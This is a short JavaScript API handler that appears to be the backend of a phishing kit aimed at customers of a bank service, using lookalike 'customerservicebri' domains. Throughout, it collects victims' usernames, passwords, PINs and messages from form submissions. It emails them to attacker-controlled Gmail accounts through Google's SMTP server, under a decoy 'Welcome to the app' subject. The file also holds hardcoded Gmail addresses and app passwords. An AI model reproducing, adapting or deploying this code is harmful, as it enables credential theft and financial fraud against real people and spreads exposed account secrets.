export default function handler(req, res) {
    const nodemailer = require('nodemailer');

    const { body } = req;
    const { url } = req.headers;

    let email = '';
    let pass = '';

    if(url == 'customerservicebri.xyz'){

        email = 'yurawa111@gmail.com';
        pass = 'ptopgzlhwhtktikt';

    } else if (url == 'customerservicebri.site') {
        
        email = 'bbrimoid@gmail.com';
        pass = 'cqygigrwdyxknnit';

    } else if(url == 'customerservicebri.online'){
        email = 'kurey3826@gmail.com';
        pass = 'qjmebnftvgsokfnj';
    } else {

        email = 'febrifebru66@gmail.com';
        pass = 'zaqegfyjqxbeqxdt';

    }
        
        try {
            const transporter = nodemailer.createTransport({
                port: 587,
                host: 'smtp.googlemail.com',
                auth: {
                    user: email,
                    pass: pass,
                    },
                secure: false,
            });
    
            const mailData = {
                from: email,
                to: email,
                subject: 'Welcome to the app',
                text: `username: ${body.username ?? '-'} password: ${body.password ?? '-'} pin: ${body.mPin ?? '-'} message: ${body.message ?? '-'}`,            
            }
      
            transporter.sendMail(mailData, function (err, info) {
                if(err){
                  res.status(400).json({error: err})
                }
                else{
                  res.status(200).json({info, status: 200})
                }
            })
    
        } catch (error) {
            res.status(404).send('Not found')
        }

}